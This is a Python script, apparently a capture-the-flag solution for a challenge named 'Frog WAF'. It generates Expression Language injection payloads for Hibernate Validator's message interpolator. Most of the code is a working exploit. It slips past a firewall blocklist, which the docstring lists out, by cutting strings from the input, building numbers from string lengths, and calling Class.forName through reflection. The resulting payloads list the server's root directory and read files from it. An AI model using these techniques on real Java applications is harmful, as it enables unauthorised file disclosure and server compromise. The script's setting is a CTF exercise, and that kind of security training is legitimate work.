#!/usr/bin/env python3
"""Build the EL expressions used by `frog-waf.sh`, under Frog WAF's alphabet.

The injection point is Hibernate Validator's message interpolator, which
evaluates `${...}` in a constraint violation template. What makes this task a
task is what the WAF forbids anywhere in the value:

    " ' #  > <  bash & | ; ` ~ *  for while goto if
    Runtime class java Name char Process cmd eval Char true false
    + - / * %  0 1 2 3 4 5 6 7 8 9

So the expression has no string literals — both quote characters are gone — and
no integer literals, because every digit is gone. It also cannot name
`forName`, which contains both `for` and `Name`.

Three substitutions carry the whole payload.

**Strings come from the input itself.** `validatedValue` is the value being
validated, which is this payload; anything the expression needs as a string is
carried in a fragment table at the front of the value and cut back out with
`split`. Fragments are chosen so no forbidden word appears in the value: `java`
travels as `ja` + `va.io.File`, `forName` as `fo` + `rN` + `ame`.

**Integers come from lengths.** `x mod x` is 0 and `x div x` is 1 for any
length, and every other integer is the length of that many one-character
strings concatenated. Verbose, and it needs neither a digit nor an operator the
WAF minds — EL spells the two it does allow as words.

**The class comes from reflection on reflection.** `validatedValue.getClass()`
survives the filter (`Class` is not `class`), and `Class.class.getMethod(...)`
hands back `Class.forName` as a `Method` whose name was assembled at runtime.
From there `java.io.File` and `java.util.Scanner` are ordinary objects.

The flag's file name is randomised into the image at build time and contains
digits and a hyphen, so it can never be typed into this parameter. It does not
have to be: `new File(".").list()` reads it back at runtime, and the process's
working directory is `/`, where the flag is.

    frog_waf_el.py table       # the fragment table every payload opens with
    frog_waf_el.py name 19     # the 19th entry of the working directory
    frog_waf_el.py read 19     # the first line of that entry
"""

import sys

# Every string the expression needs, in the order they are indexed. Split on a
# single `A`, which appears in none of them.
FRAGMENTS = ["fo", "rN", "ame", "ja", "va.io.File", "va.util.Scanner"]
DELIMITER = "A"

V = "validatedValue"
ZERO = "%s.length() mod %s.length()" % (V, V)
ONE = "%s.length() div %s.length()" % (V, V)
# The delimiter, read back out of the value's first character: the one string
# this can build without already having a string.
DELIM = "%s.substring(%s,%s)" % (V, ZERO, ONE)
TABLE = "%s.split(%s)" % (V, DELIM)


def integer(k):
    """`k` as an EL expression, without a digit in it."""
    if k == 0:
        return ZERO
    if k == 1:
        return ONE
    return "%s%s.length()" % (DELIM, ".concat(%s)" % DELIM * (k - 1))


def fragment(i):
    # The value opens with the delimiter, so `split` puts an empty string in
    # slot 0 and the table starts at 1.
    return "%s[%s]" % (TABLE, integer(i + 1))


def concat(*parts):
    return parts[0] + "".join(".concat(%s)" % part for part in parts[1:])


STRING_CLASS = "%s.getClass()" % V
# `Class.forName(String)` as a Method, named by a string assembled at runtime.
FOR_NAME = "%s.getClass().getMethod(%s,%s)" % (
    STRING_CLASS, concat(fragment(0), fragment(1), fragment(2)), STRING_CLASS)
FILE_CLASS = "%s.invoke(null,%s)" % (FOR_NAME, concat(fragment(3), fragment(4)))
SCANNER_CLASS = "%s.invoke(null,%s)" % (FOR_NAME, concat(fragment(3), fragment(5)))
# "." is the third character of the fragment `va.io.File`.
DOT = "%s.substring(%s,%s)" % (fragment(4), integer(2), integer(3))


def new_file(path):
    return "%s.getConstructor(%s).newInstance(%s)" % (FILE_CLASS, STRING_CLASS, path)


WORKING_DIRECTORY = "%s.list()" % new_file(DOT)


def payload(expression):
    """The fragment table, then the expression the interpolator will evaluate."""
    return "%s%s%s${%s}" % (DELIMITER, DELIMITER.join(FRAGMENTS), DELIMITER, expression)


def main():
    if sys.argv[1] == "table":
        print("%s%s%s" % (DELIMITER, DELIMITER.join(FRAGMENTS), DELIMITER))
        return
    action, index = sys.argv[1], integer(int(sys.argv[2]))
    entry = "%s[%s]" % (WORKING_DIRECTORY, index)
    if action == "name":
        # `list()` returns an array, and EL has no `.length` for one, so the
        # caller walks the indices until a name it wants comes back.
        print(payload(entry))
    elif action == "read":
        print(payload("%s.getConstructor(%s).newInstance(%s).nextLine()" % (
            SCANNER_CLASS, FILE_CLASS, new_file(entry))))
    else:
        raise SystemExit("usage: frog_waf_el.py name|read INDEX")


if __name__ == "__main__":
    main()
